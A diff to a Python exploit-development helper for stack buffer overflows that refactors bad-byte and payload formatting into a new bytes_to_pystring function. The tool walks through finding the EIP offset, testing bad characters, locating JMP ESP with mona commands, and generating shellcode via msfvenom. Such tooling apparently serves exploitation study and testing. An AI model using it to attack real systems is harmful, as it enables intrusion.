@@ -32,12 +32,7 @@ def main():
 	if not args.badbytes_known:
 		badbytes = check_badbytes(target, badbytes, eip_offset, args)
 	
-	badbytes_str = ''
-	for b in badbytes:
-		b = str(hex(b))[2::]
-		if len(b) == 1:
-			b = '0' + b
-		badbytes_str += '\\x' + b
+	badbytes_str = bytes_to_pystring(badbytes)
 	print(f'Bad bytes: {badbytes_str}')
 
 	# generate buffer
@@ -62,14 +57,13 @@ def getJmpESPAddr(badbytes):
 	print("Get EIP to jump to payload...")
 	if args.target_eip:
 		return args.target_eip
-	badbytes_str = ""
-	for b in badbytes:
-		badbytes_str += "\\x" + str(hex(b))[2::]
+	badbytes_str = bytes_to_pystring(badbytes)
 	print(f'!mona jmp -r esp -cpb \"{badbytes_str}\"')
 	print(f'!mona find -s \'jmp esp\' -type instr -cm aslr=false,rebase=false,nx=false -cpb \"{badbytes_str}\"')
 	eip = input('Target Jump Address.\n> ')
 	eip = bytes.fromhex(eip)[::-1]
-	print(f'Target EIP: {eip}')
+	eip_str = bytes_to_pystring(eip).replace('\\x', '')
+	print(f'Target EIP: 0x{eip_str}')
 	return eip
 
 def check_badbytes(target, badbytes, eip_offset, args):
@@ -77,7 +71,8 @@ def check_badbytes(target, badbytes, eip_offset, args):
 	while keepLooking:
 		print(f'Known bad bytes: {badbytes}')
 		print(f'Restart target. Generate comparison bytearray:')
-		print(f'!mona bytearray 256 -b {str(badbytes)[1::]}')
+		badbytes_str = bytes_to_pystring(badbytes)
+		print(f'!mona bytearray 256 -b \'{badbytes_str}\'')
 		input('Press enter when target running.')
 		# use bytearray for easy indexing
 		checkbytes = bytearray(0x100 - len(badbytes))
@@ -167,7 +162,7 @@ def gen_payload(badbytes, args):
 		print('Reading from File...')
 		payload = args.payload_file_bin.read()
 		print('-' * 20 + 'PAYLOAD' + '-' * 20)
-		print(payload)
+		print(bytes_to_pystring(payload))
 		print('-' * 20 + '  END  ' + '-' * 20)
 		return payload
 	
@@ -180,7 +175,7 @@ def gen_payload(badbytes, args):
 		print('')
 		payload = bytes.fromhex(payload_hex)
 		print('-' * 20 + 'PAYLOAD' + '-' * 20)
-		print(payload)
+		print(bytes_to_pystring(payload))
 		print('-' * 20 + '  END  ' + '-' * 20)
 		return payload
 	
@@ -199,7 +194,7 @@ def gen_payload(badbytes, args):
 	msfvenom_cmd = args.msfvenom
 	
 	# add badbytes
-	badbytes_str = str(badbytes)[1::]
+	badbytes_str = '\'' + bytes_to_pystring(badbytes) + '\''
 	msfvenom_cmd += f' --bad-chars {badbytes_str}'
 	
 	# add output format raw
@@ -299,7 +294,7 @@ def gen_payload(badbytes, args):
 	print('')
 	payload = bytes.fromhex(payload_hex)
 	print('-' * 20 + 'PAYLOAD' + '-' * 20)
-	print(payload)
+	print(bytes_to_pystring(payload))
 	print('-' * 20 + '  END  ' + '-' * 20)
 	return payload
 	
@@ -369,6 +364,7 @@ def genPattern(pattern_length, args):
 	return pattern
 
 def findPattern(length, eip, args):
+	eip_str = bytes_to_pystring(eip).replace('\\x','')
 	print(f'EIP-LE: {eip}')
 	# reverse, because intel is weird (little endian)
 	pattern_found = bytes.fromhex(eip).decode('ascii')[::-1]
@@ -517,6 +513,17 @@ def parse_args():
 		args.payload_options = payload_options
 
 	return args
+
+def bytes_to_pystring(bs):
+	result = ''
+	for b in bs:
+		# get "0xFF", cut off "0x"
+		b = str(hex(b))[2::]
+		# if single digit, pad left with "0"
+		if len(b) == 1:
+			b = '0' + b
+		result += '\\x' + b
+	return result
 
 def string_to_bytes(string):
 	result = b''
